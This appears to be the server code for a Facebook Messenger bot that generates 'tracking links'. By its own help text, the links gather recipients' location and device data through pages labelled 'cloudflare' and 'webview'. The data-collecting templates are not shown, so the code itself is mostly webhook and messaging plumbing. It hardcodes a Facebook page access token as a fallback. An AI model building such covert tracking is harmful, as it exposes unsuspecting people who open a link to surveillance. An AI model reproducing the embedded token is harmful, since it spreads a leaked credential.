require('dotenv').config();
const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");

const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const PAGE_ACCESS_TOKEN = process.env.PAGE_ACCESS_TOKEN || "EAAUG0iogqEYBO3H4mS1GDZBZCDSiL2LYZB8iwYwxT86BfXiQtpCUvkXsvm8nmDYNdrH1fxBQ3wyT7660p4kIM3ZBDxegl3GYiAZB1hknXfBxHkgLjIeyZAitiAqQOkvcGZAfHusF6pqgeq9Xm6ZBXCZCXKzX6YMo56b9YH7uxknYHhMZAQvQaLw8OnsvzKexvLIKuS9QZDZD";
const VERIFY_TOKEN = process.env.VERIFY_TOKEN || "hackbot";
const hostURL = "https://trackdown-efzv.onrender.com/webhook"; // Replace with your URL

// Set EJS as the view engine
app.set("view engine", "ejs");
app.set("views", "./views"); // Assuming "views" is the folder where cloudflare.ejs and webview.ejs are stored

// Serve static files if needed
app.use(express.static("public"));

// Track users awaiting URL input
const userStates = {};

// Webhook verification
app.get("/webhook", (req, res) => {
    const mode = req.query["hub.mode"];
    const token = req.query["hub.verify_token"];
    const challenge = req.query["hub.challenge"];

    if (mode && token) {
        if (mode === "subscribe" && token === VERIFY_TOKEN) {
            console.log("WEBHOOK_VERIFIED");
            res.status(200).send(challenge);
        } else {
            res.sendStatus(403);
        }
    }
});

// Webhook event handling
app.post("/webhook", (req, res) => {
    const body = req.body;

    if (body.object === "page") {
        body.entry.forEach(entry => {
            const webhookEvent = entry.messaging[0];
            const senderId = webhookEvent.sender.id;

            if (webhookEvent.message && webhookEvent.message.text) {
                handleMessage(senderId, webhookEvent.message);
            } else if (webhookEvent.postback) {
                handlePostback(senderId, webhookEvent.postback);
            }
        });

        res.status(200).send("EVENT_RECEIVED");
    } else {
        res.sendStatus(404);
    }
});

// Function to handle received messages
function handleMessage(senderId, receivedMessage) {
    let response;

    // Check if the user is expected to enter a URL
    if (userStates[senderId] === "awaiting_url") {
        const url = receivedMessage.text;

        // Validate URL (simple check, can be improved)
        if (url.startsWith("http://") || url.startsWith("https://")) {
            response = { text: `URL received: ${url}` };
            delete userStates[senderId]; // Clear the state
        } else {
            response = { text: `Please enter a valid URL starting with http:// or https://` };
        }
    } else {
        // Handle commands
        if (receivedMessage.text.toLowerCase() === "/start") {
            response = { text: `Welcome! Use this bot to create tracking links. Type /create to start.` };
        } else if (receivedMessage.text.toLowerCase() === "/create") {
            response = { text: `🌐 Please enter your URL:` };
            userStates[senderId] = "awaiting_url"; // Set state to expect URL input
        } else if (receivedMessage.text.toLowerCase() === "/help") {
            response = {
                text: `Instructions:\n1. Use /create to start.\n2. Enter a URL to generate tracking links.\n\nNote: This bot gathers info like location and device data.`
            };
        } else {
            response = { text: `Unknown command.` };
        }
    }

    callSendAPI(senderId, response);
}

// Function to handle postback responses
function handlePostback(senderId, receivedPostback) {
    let response;

    if (receivedPostback.payload === "CREATE_NEW") {
        response = { text: `🌐 Enter Your URL` };
        userStates[senderId] = "awaiting_url"; // Set state to expect URL input
    }

    callSendAPI(senderId, response);
}

// Function to send messages to the Facebook API
function callSendAPI(senderId, response) {
    fetch(`https://graph.facebook.com/v12.0/me/messages?access_token=${PAGE_ACCESS_TOKEN}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            recipient: { id: senderId },
            message: response,
        }),
    })
        .then((res) => res.json())
        .then((json) => console.log(json))
        .catch((err) => console.error("Error sending message:", err));
}

// Route to render cloudflare.ejs
app.get("/cloudflare", (req, res) => {
    res.render("cloudflare", {
        title: "Cloudflare Page",
        description: "This is the Cloudflare tracking page."
    });
});

// Route to render webview.ejs
app.get("/webview", (req, res) => {
    res.render("webview", {
        title: "Webview Page",
        content: "This is the WebView tracking page."
    });
});

// Start the server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
        
